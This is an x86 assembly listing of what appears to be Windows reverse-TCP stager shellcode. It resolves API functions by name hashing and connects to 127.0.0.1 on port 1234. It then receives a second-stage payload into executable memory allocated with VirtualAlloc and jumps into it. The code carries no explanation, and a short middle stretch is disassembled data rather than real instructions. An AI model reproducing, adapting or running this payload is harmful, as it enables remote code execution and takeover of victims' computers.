```asm
_start:
    cld
    nop
    call L_95
RET_6:
    pushal
    xor edx, edx
    mov ebp, esp
    nop
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    mov esi, dword ptr [edx + 0x28]
    movzx ecx, word ptr [edx + 0x26]
    xor edi, edi
    nop
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    nop
    push edx
    mov edx, dword ptr [edx + 0x10]
    push edi
    nop
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    push eax
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    nop
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    xor edi, edi
    nop
L_57:
    xor eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    nop
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    mov eax, ebp
    call eax
    mov eax, 0x190
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xa
    nop
L_bc:
    push 0x100007f
    push 0xd2040002
    mov esi, esp
    push eax
    push eax
    push eax
    push eax
    inc eax
    push eax
    inc eax
    push eax
    push 0xe0df0fea
    call ebp
    xchg edi, eax
    nop
L_d8:
    push 0x10
    push esi
    push edi
    push 0x6174a599
    call ebp
    test eax, eax
    je L_f1
    dec dword ptr [esi + 8]
    jne L_d8
L_ec:
    call L_179
L_f1:
    push 0
    nop
    push 0x10
    call L_10a
    rcl byte ptr [edi + edx*4]
    wait
    cmp byte ptr [ebx + 0x4b], dh
    insd dword ptr es:[edi], dx
    xchg esi, eax
    push cs
    xchg edi, eax
PADDD_START:
    paddd mm0, qword ptr [0x68571632]
    .equ L_10a, PADDD_START + 5
    ret 0x38eb
    pop edi
    call ebp
    push 0
    push 4
    push esi
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_15a
    mov esi, dword ptr [esi]
    nop
    push 0x40
    push 0x1000
    push esi
    push 0
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
L_139:
    push 0
    push esi
    push ebx
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jge L_172
    pop eax
    push 0x4000
    push 0
    push eax
    push 0x300f2f0b
    call ebp
L_15a:
    push edi
    push 0x614d6e75
    call ebp
    pop esi
    pop esi
    dec dword ptr [esp]
    jne L_bc
    jmp L_ec
L_172:
    add ebx, eax
    sub esi, eax
    jne L_139
    ret
L_179:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```